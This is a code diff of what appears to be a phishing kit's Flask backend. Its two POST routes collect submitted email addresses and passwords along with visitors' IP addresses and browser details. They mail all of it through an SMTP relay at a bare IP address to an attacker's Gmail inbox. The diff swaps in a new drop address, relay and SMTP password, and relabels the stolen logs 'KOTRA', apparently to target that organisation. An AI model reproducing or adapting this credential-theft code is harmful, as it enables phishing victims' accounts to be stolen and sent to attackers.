@@ -150,9 +150,6 @@ def route2():
 @app.route('/first', methods=['POST'])
 def first():
     if request.method == 'POST':
-        web_param = request.args.get('web')
-        if web_param:
-        session['eman'] = web_param
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
             ip = request.headers.get('X-Real-IP')
@@ -164,11 +161,11 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'bcjung0071@gmail.com'
-        password = 'vip5071dc7bc887'
+        receiver_email = 'danielnewwoj@gmail.com'
+        password = 'vip6ebdd04ea6df'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
-        message['Subject'] = 'General KR Logs !'
+        message['Subject'] = 'KOTRA Logs !'
         message['From'] = sender_email
         message['To'] = receiver_email
         text = \
@@ -184,7 +181,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('79.141.166.29', 6040) as server:
+        with smtplib.SMTP('77.83.196.189', 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -194,9 +191,6 @@ def first():
 @app.route('/second', methods=['POST'])
 def second():
     if request.method == 'POST':
-        web_param = request.args.get('web')
-        if web_param:
-            session['eman'] = web_param
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
             ip = request.headers.get('X-Real-IP')
@@ -208,11 +202,11 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'bcjung0071@gmail.com'
-        password = 'vip5071dc7bc887'
+        receiver_email = 'danielnewwoj@gmail.com'
+        password = 'vip6ebdd04ea6df'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
-        message['Subject'] = 'General KR logs !! '
+        message['Subject'] = 'KOTRA logs !! '
         message['From'] = sender_email
         message['To'] = receiver_email
         text = \
@@ -228,7 +222,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('79.141.166.29', 6040) as server:
+        with smtplib.SMTP('77.83.196.189', 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
